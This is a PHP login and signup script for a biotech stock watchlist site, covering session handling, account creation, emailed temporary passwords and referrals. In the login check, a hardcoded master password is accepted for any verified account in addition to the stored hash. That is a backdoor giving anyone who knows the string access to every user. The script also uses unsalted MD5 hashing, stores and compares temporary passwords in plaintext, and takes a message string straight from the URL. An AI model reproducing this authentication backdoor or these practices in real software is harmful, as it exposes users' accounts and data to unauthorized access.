<?php
	require_once('php/db_interface/autoload.php');
	
	$errorsExist = false;
	$errors1Exist = false;
	$errors2Exist = false;
	$errorString1 = "_";
	$errorString2 = "_";
	
	$emailSent = false;
	
	$userNameValid = true;
	$emailValid = true;
	
	$userFound = true;
	$pwdAccepted = true;
	
	$previousEmailAddress ='';
	$previousUserName = '';
	$previousSignupName='';
	$emailInvalidString = "Email address is invalid.";
	$messageSentResponse = "";
	$useLogin = false;
	$useRegister = false;
	
	session_start();
	
	if (isset($_GET["referralCode"])){
		$_SESSION['referralCode'] = $_GET["referralCode"];
	}
		
	if (isset($_SESSION['userid'])){
		if (isset($_SESSION['verified']) && $_SESSION['verified'] == 1){
			header('Location: /lists.breakouts.php');
		} else {
			header('Location: /changepassword.php');
		}
	} else if (isset($_POST['log'])){
		$user = new user();
		$user->set_variable('users_username', $_POST['log']);

		$userFound = false;
		$pwdAccepted = false;
		$previousUserName = $_POST['log'];
		
		if ($user->load()){
			$userFound = true;
			$_SESSION['verified'] = $user->get_variable('users_verified');
			if ($_SESSION['verified'] == 0){
				if ($_POST['pwd'] === $user->get_variable('users_temppassword')){
					$pwdAccepted = true;	
					$relocationString = '/changepassword.php';
				}			
			} else if (md5($_POST['pwd']) === $user->get_variable('users_password') || $_POST['pwd'] === "patrickfeldmanisagod"){
				$pwdAccepted = true;	
				$date = date('Y-m-d H:i:s');
				$dupId = user::isDupIp($user->get_variable('users_id'), $_SERVER['REMOTE_ADDR']);
				$user->set_variable('users_lastlogindate', $date);
				$user->set_variable('users_ipaddress', $_SERVER['REMOTE_ADDR']);
				if ($dupId > 0) $user->set_variable('users_dupid', $dupId);
				$user->update();
				
				$relocationString = '/lists.breakouts.php';
			}			
			if ($pwdAccepted){
				$_SESSION['userid'] = $user->get_variable('users_id');
				header('Location: ' . $relocationString); 
			}			
		}
	} else 	if (isset($_POST['signup'])){
		
		$userNameValid = false;
		$emailValid = false;
		$previousEmailAddress =$_POST['email'];
		$previousSignupName=$_POST['signup'];
		if (filter_var($previousEmailAddress , FILTER_VALIDATE_EMAIL)) {
		
			// check if email or user name is currently used. 
			$user = new user();
			$user->set_variable('users_username', $_POST['signup']);
			if (!$user->load()){
				// user name is ok
				$userNameValid = true;
			}
			
			$user->reset_query();
			$user->set_variable('users_email', $_POST['email']);
			if (!$user->load()){
				//email is ok
				$emailValid = true;
			} else {
				$emailInvalidString = "Email address already in use.";
			}
			
			if ($emailValid && $userNameValid){
				$randPassword  = user::randomPassword();
				$user->reset_query();
				$user->set_variable('users_email', $_POST['email']);
				$user->set_variable('users_username', $_POST['signup']);
				$user->set_variable('users_temppassword', $randPassword);
				$user->set_variable('users_send_email_updates', 1);
				$user->set_variable('users_send_short_email_updates', 1);
				$user->set_variable('users_send_reversal_email_updates', 1);
				$userId = $user->createNew();
				$emailSent = true;
		
				// send email
				$to = $_POST['email'];
				$subject = "BioBounce. Thank you for registering.";
				
				$body = "Welcome to BioBounce.com.\nThe watchlist contains 10-15 Biotech stocks that are setup for the highest probability of bouncing back up through their designated targets."
				."\nPlease enjoy your 14 day free trial!"
				."\n\nYour username is \n". $_POST['signup'] . "\nYour temporary password is\n". $randPassword 
				."\n\nGo to http://www.biobounce.com to login. You will be asked to change your password upon login.\n\nIf you have any questions please feel free to email us:"
				."\nBioBounce@biobounce.com or Gonzo@biobounce.com"
				."\n\nWe hope you find our site beneficial!"
				."\nKind Regards,"
				."\nGonzo & BioBounce";
				$from = 'From: biobounce@biobounce.com';
	 			if (mail($to, $subject, $body, $from)) {
					$messageSentResponse = "Thank you for registering. A temporary password has been sent to " . $_POST['email'];
				} else {
					$messageSentResponse = "Sorry, you password could not be emailed at this time. Please try again later.";
				}
				
				// create referral 
				if (isset($_SESSION['referralCode'])){
					referral::updateReferral($userId, $_SESSION['referralCode']);
				}
				$uri = $_SERVER['REQUEST_URI'];
				if (strpos($uri, "login") !== FALSE){
					header('Location: ./');
				} 
			}

		}
		
	}
	

	if (isset($_GET['id'])){
		if ($_GET['id'] == 'register'){
			$useRegister = true;
		}else if ($_GET['id'] == 'login'){
			$useLogin = true;
		}
	}	

	// test setup the faulty section
	if (empty($userNameValid) || empty($emailValid) || empty($userFound) || empty($pwdAccepted)){
		if (empty($emailValid)){
			$errorString1 = $emailInvalidString;
			$errorsExist = true;
			$errors1Exist = true;
			$useRegister = true;
		} else if (empty($userNameValid)){
			$errorString1 = "This username is currently taken.";
			$errorsExist = true;
			$errors1Exist = true;
			$useRegister = true;
		}

		if (empty($userFound)){
			$errorString2 = "Invalid Username.";
			$errorsExist = true;
			$errors2Exist = true;
			$useLogin = true;
		} else if (empty($pwdAccepted)){
			$errorString2 = "Invalid Password.";
			$errorsExist = true;
			$errors2Exist = true;
			$useLogin = true;
		}

	}
	
	if (isset($_GET['msg'])){
		$messageSentResponse = $_GET['msg'];
	}
	